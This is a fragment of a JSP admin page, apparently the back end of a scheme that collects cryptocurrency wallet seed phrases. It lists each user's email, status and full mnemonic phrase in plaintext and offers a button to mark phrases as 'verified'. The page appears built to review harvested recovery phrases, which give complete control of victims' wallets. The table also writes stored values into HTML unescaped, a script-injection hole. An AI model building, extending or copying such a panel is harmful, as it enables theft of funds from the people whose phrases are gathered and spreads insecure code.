...
<head>
	...
	<title>Mnemonics | Admin Panel</title>
	<meta charset="utf-8">
				...
				<div class="app-sidebar-menu overflow-hidden flex-column-fluid">
					...
					<div id="kt_app_sidebar_menu_wrapper" class="app-sidebar-wrapper hover-scroll-overlay-y my-5" data-kt-scroll="true" data-kt-scroll-activate="true" data-kt-scroll-height="auto" data-kt-scroll-dependencies="#kt_app_sidebar_logo, #kt_app_sidebar_footer" data-kt-scroll-wrappers="#kt_app_sidebar_menu" data-kt-scroll-offset="5px" data-kt-scroll-save-state="true">
						...
						<div class="menu menu-column menu-rounded menu-sub-indention px-3" id="#kt_app_sidebar_menu" data-kt-menu="true" data-kt-menu-expand="false">
							...
							<div class="menu-item">
								<!--begin:Menu link-->
								<a class="menu-link active" href="/admin/mnemonics">
                                 <span class="menu-icon">
												<!--begin::Svg Icon | path: icons/duotune/general/gen002.svg-->
												<span class="svg-icon svg-icon-2">
													<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					...
					<div id="kt_app_toolbar" class="app-toolbar py-3 py-lg-6">
						...
						<div id="kt_app_toolbar_container" class="app-container container-fluid d-flex flex-stack">
							...
							<div class="page-title d-flex flex-column justify-content-center flex-wrap me-3">
								<!--begin::Title-->
								<h1 class="page-heading d-flex text-dark fw-bold fs-3 flex-column justify-content-center my-0">Mnemonics List</h1>
								<!--end::Title-->
								<!--begin::Breadcrumb-->
								<ul class="breadcrumb breadcrumb-separatorless fw-semibold fs-7 my-0 pt-1">
									...
									<!--end::Item-->
									<!--begin::Item-->
									<li class="breadcrumb-item text-muted">Mnemonics</li>
									<!--end::Item-->
								</ul>
								<!--end::Breadcrumb-->
							</div>
									...
									<div class="table-responsive">
										...
										<table class="table table-row-dashed align-middle gs-0 gy-3 table-striped">
											...
											<tr class="fw-bold text-muted">
												...
												<th class="min-w-400px">Mnemonic</th>
											...
											<tbody>
											<%
												List<Map<String, Object>> mnems = (List<Map<String, Object>>) request.getAttribute("mnemonics");
												for (Map<String, Object> mnema : mnems) {
													Object id = mnema.get("id");
													Object userId = mnema.get("user_id");
													Object email = mnema.get("email");
													Object status = mnema.get("status");
													Object date = mnema.get("date");
													Object mnem = mnema.get("mnemonic");
													out.println("<tr><td>" + email + "</td>\n" +
															"<td><span class=\"addtobadgestat badge badge-light-" + (status.equals("Deleted") ? "danger" : status.equals("Verified") ? "success" : "primary") + "\">" + status + "</span></td>\n" +
															"<td>" + date + "</td>\n" +
															"<td>" + mnem + "</td>\n");
													if (status.equals("Not verified")) {
															out.println("<td><a onclick=\"verificate(" + userId + ", " + id + ")\" class=\"btn btn-success btn-sm\">Verificate</a></td>");
													}
													out.println("</tr>");
												}
											%>
...
<script>
	...
	function verificate(user_id, id) {
		$.ajax({
			url: "../api/admin",
			type: "POST",
			data: {
				action: "VERIFICATE_MNEMONIC",
				user_id: user_id,
				mnemonic_id: id
			},
			success: function(response) {
				if(response == "1") {
					noti("Мнемоническая фраза успешно подтверждена", "success");
				} else if (response == "2") {
					noti("Мнемоническая фраза уже подтверждена, перезагрузите страницу", "error");
				} else {
